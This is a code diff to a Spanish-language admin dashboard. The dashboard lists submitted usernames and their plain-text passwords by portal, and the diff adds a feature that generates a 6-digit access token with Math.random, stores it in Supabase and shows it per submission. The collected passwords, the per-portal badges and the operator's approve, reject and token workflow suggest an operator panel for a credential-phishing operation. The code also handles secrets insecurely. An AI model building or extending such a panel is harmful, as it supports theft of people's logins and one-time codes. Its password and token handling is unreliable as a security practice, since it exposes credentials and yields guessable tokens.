@@ -331,7 +331,7 @@
                         <th>Usuario</th>
                         <th>Contraseña</th>
                         <th>Portal</th>
-                        <th>Estado</th>
+                        <th>Estado / Token</th>
                         <th>Fecha</th>
                         <th>Acciones</th>
                     </tr>
@@ -489,6 +489,9 @@
                 case 'rechazado':
                     bg = '#fee2e2'; color = '#991b1b'; icon = 'fa-times-circle'; text = 'Rechazado';
                     break;
+                case 'token_generado':
+                    bg = '#e0e7ff'; color = '#3730a3'; icon = 'fa-key'; text = 'Token';
+                    break;
                 default:
                     bg = '#fef3c7'; color = '#b45309'; icon = 'fa-hourglass-half'; text = 'Pendiente';
             }
@@ -517,6 +520,12 @@
                 var fecha = formatDate(s.created_at);
                 var id = s.id;
 
+                // Mostrar token si existe
+                var tokenHtml = '';
+                if (s.token_acceso) {
+                    tokenHtml = '<div style="font-size: 18px; font-weight: 700; color: #3730a3; letter-spacing: 4px; font-family: monospace; margin-top: 4px;">' + escapeHtml(s.token_acceso) + '</div>';
+                }
+
                 html += '<tr>' +
                     '<td>' +
                         '<div class="user-cell">' +
@@ -529,7 +538,7 @@
                     '</td>' +
                     '<td><span class="password-cell">' + escapeHtml(s.contrasena || '') + '</span></td>' +
                     '<td><span class="portal-badge ' + s.portal + '"><i class="fas ' + portalIcon + '"></i> ' + portalLabel + '</span></td>' +
-                    '<td>' + statusBadge + '</td>' +
+                    '<td>' + statusBadge + tokenHtml + '</td>' +
                     '<td style="font-size: 12px; color: #6b7280;">' + fecha + '</td>' +
                     '<td>' +
                         '<div class="actions-cell">' +
@@ -585,12 +594,28 @@
             }
         }
 
-        // Generate token
+        // Generate token - genera un token de 6 dígitos y lo guarda en Supabase
         async function generarTokenClick(id) {
             try {
-                await actualizarEstado(id, 'token_generado');
-                console.log('✅ Token generado correctamente');
-                alert('Token generado exitosamente para la solicitud #' + id);
+                // Generar token aleatorio de 6 dígitos
+                var token = '';
+                for (var i = 0; i < 6; i++) {
+                    token += Math.floor(Math.random() * 10);
+                }
+                
+                console.log('🔑 Token generado para #' + id + ':', token);
+                
+                // Guardar el token y cambiar estado a token_generado
+                var query = 'id=eq.' + id;
+                await supabaseFetch('PATCH', {
+                    query: query,
+                    body: { 
+                        estado: 'token_generado',
+                        token_acceso: token
+                    }
+                });
+                
+                console.log('✅ Token guardado correctamente para #' + id);
                 await cargarSolicitudes();
             } catch (err) {
                 console.error('❌ Error al generar token:', err);
